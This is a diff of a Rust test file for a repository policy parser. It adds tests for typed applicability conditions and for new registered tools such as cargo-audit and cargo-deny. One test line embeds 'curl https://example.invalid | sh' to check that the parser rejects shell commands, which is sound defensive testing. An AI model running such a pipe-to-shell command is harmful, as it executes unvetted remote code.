@@ -1,4 +1,7 @@
-use jameskills_core::domain::policy::parse_policy;
+use jameskills_core::domain::{
+    ToolId, ToolOperation,
+    policy::{ApplicabilityFact, parse_policy},
+};
 
 const POLICY: &str = include_str!("../../../tests/fixtures/valid-suite/policies/repository.toml");
 
@@ -14,7 +17,7 @@ fn repository_policy_fixture_parses_typed_requirements_and_registered_tools() {
     let policy = parse_policy(POLICY.as_bytes()).unwrap();
     assert_eq!(policy.profile(), "repository-foundation");
     assert_eq!(policy.requirements().len(), 10);
-    assert_eq!(policy.tool_requirements().len(), 7);
+    assert_eq!(policy.tool_requirements().len(), 8);
     assert!(
         policy
             .requirements()
@@ -72,11 +75,71 @@ fn policy_rejects_unregistered_tools_operations_and_shell_commands() {
         "policy.operation.invalid"
     );
 
+    let unsupported_pair = POLICY.replace("tool_id = \"gitleaks\"", "tool_id = \"node\"");
+    assert_eq!(
+        first_code(&parse_policy(unsupported_pair.as_bytes())),
+        "policy.operation.invalid"
+    );
+
     let shell = format!("{POLICY}\ncommand = \"curl https://example.invalid | sh\"\n");
     assert_eq!(
         first_code(&parse_policy(shell.as_bytes())),
         "policy.invalid"
     );
+}
+
+#[test]
+fn policy_conditions_are_typed_and_reject_unregistered_facts_or_values() {
+    let source = POLICY.replace(
+        "id = \"repo.readme\"",
+        "id = \"repo.readme\"\napplies_when = { fact = \"stack\", equals = \"rust\" }",
+    );
+    let policy = parse_policy(source.as_bytes()).unwrap();
+    let requirement = policy
+        .requirements()
+        .iter()
+        .find(|requirement| requirement.id() == "repo.readme")
+        .unwrap();
+    let condition = requirement.applies_when().unwrap();
+    assert_eq!(condition.fact(), ApplicabilityFact::Stack);
+    assert_eq!(condition.equals(), "rust");
+
+    for (fact, value) in [("tool-path", "cargo"), ("stack", "web"), ("os", "macos")] {
+        let source = POLICY.replace(
+            "id = \"repo.readme\"",
+            &format!(
+                "id = \"repo.readme\"\napplies_when = {{ fact = \"{fact}\", equals = \"{value}\" }}"
+            ),
+        );
+        assert_eq!(
+            first_code(&parse_policy(source.as_bytes())),
+            "policy.applies_when.invalid"
+        );
+    }
+}
+
+#[test]
+fn extended_registered_tools_have_closed_version_and_audit_operations() {
+    let source = format!(
+        "{POLICY}\n\
+[[tool_requirements]]\ntool_id = \"node\"\noperation = \"version\"\nversion = \">=1.0.0\"\n\
+[[tool_requirements]]\ntool_id = \"rustc\"\noperation = \"version\"\nversion = \">=1.0.0\"\n\
+[[tool_requirements]]\ntool_id = \"cargo-audit\"\noperation = \"audit\"\nversion = \">=1.0.0\"\n\
+[[tool_requirements]]\ntool_id = \"cargo-deny\"\noperation = \"deny\"\nversion = \">=1.0.0\""
+    );
+    let policy = parse_policy(source.as_bytes()).unwrap();
+
+    assert_eq!(policy.tool_requirements().len(), 12);
+    assert!(policy.tool_requirements().iter().any(|requirement| {
+        requirement.tool_id() == ToolId::Node && requirement.operation() == ToolOperation::Version
+    }));
+    assert!(policy.tool_requirements().iter().any(|requirement| {
+        requirement.tool_id() == ToolId::CargoAudit
+            && requirement.operation() == ToolOperation::Audit
+    }));
+    assert!(policy.tool_requirements().iter().any(|requirement| {
+        requirement.tool_id() == ToolId::CargoDeny && requirement.operation() == ToolOperation::Deny
+    }));
 }
 
 #[test]
